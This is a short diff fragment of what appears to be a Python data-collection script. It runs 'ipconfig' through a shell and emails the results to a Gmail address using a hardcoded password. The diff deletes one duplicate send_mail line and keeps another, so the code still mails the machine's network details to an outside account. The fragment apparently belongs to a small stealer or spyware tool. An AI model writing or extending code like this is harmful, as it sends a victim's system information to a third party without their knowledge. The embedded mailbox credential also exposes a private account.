@@ -37,7 +37,6 @@ command = "ipconfig"
 result2 = subprocess.check_output(command, shell=True)
 
 
-send_mail("captianlastimosa@gmail.com", "", result1)
 
 send_mail("captianlastimosa@gmail.com", "wither14", result1)
 
